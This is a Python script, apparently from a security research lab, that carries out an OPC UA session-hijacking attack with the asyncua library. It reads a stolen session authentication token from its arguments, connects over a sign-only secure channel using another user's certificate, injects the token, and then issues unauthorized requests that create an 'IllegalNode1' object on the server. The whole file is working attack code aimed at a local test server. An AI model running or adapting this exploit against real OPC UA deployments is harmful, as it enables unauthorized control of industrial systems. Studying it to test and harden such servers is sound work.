import asyncio
import logging
import sys
import socket
from pathlib import Path

sys.path.insert(0, "venv/session-hijack-attacker")
from asyncua import Client
from asyncua.crypto.security_policies import SecurityPolicyBasic256Sha256
from asyncua import ua

logging.basicConfig(level=logging.INFO)
_logger = logging.getLogger(__name__)

# Client's certificate and private key
cert_base = Path(__file__).parent
cert = Path(cert_base / f"client.der")
private_key = Path(cert_base / f"client.pem")

# Attacker doesn't need to know user 1's key or certificate to steal the session
user2_cert = Path(cert_base / f"user-certificates/user2-cert.der")
user2_private_key = Path(cert_base / f"user-certificates/user2.pem")

async def task(loop, port_no):
    host_name = socket.gethostname()
    client_app_uri = f"urn:{host_name}:foobar:myselfsignedclient"
    url = "opc.tcp://user1@127.0.0.1:4840/freeopcua/server/"


    # Create client and set security policies
    client = Client(url=url)
    client.application_uri = client_app_uri
    await client.set_security(
        SecurityPolicyBasic256Sha256,
        certificate=str(cert),
        private_key=str(private_key),
        server_certificate = Path(cert_base / f"client-truststore/server.der"),
        # Sign-only mode
        mode = 2
    )

    await client.load_client_certificate(user2_cert, extension="der")
    await client.load_private_key(user2_private_key, extension="pem")

    try:
        # Open channel (channel and token ID swapped in)
        await client.connect_socket(port=port_no)

        # Channel ID and the Token ID are updated in here
        await client.open_secure_channel(renew=True)
        
        from asyncua.ua import NodeId, NodeIdType
        import uuid
        # Read in the stolen authentication token and use it
        with open("attack.txt", "r") as f:
            inputs = f.readlines()
            guid = uuid.UUID(inputs[2])
            client.uaclient.protocol.authentication_token = NodeId(guid, 1, NodeIdType.Guid)
        
        # ARBITRARY REQUESTS
        objects = client.nodes.objects
        try:
            child = await objects.get_child(["1:IllegalNode1"])
            print(child)
        except ua.UaError:
            print("No Match Found")
        obj = await objects.add_object(1, "IllegalNode1")
        try:
            child = await objects.get_child(["1:IllegalNode1"])
            print("Object now exists:", child)
        except ua.Error:
            print("No Match Found")

    except ua.UaError as exp:
        _logger.error(exp)

def main(port_no, channelid, tokenid, guid):
    # Save values to file
    with open("attack.txt", "w") as f:
        f.write(channelid + "\n")
        f.write(tokenid + "\n")
        f.write(guid)

    loop = asyncio.get_event_loop()
    loop.set_debug(True)
    loop.run_until_complete(task(loop, port_no))
    loop.close()

if __name__ == "__main__":
    main(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
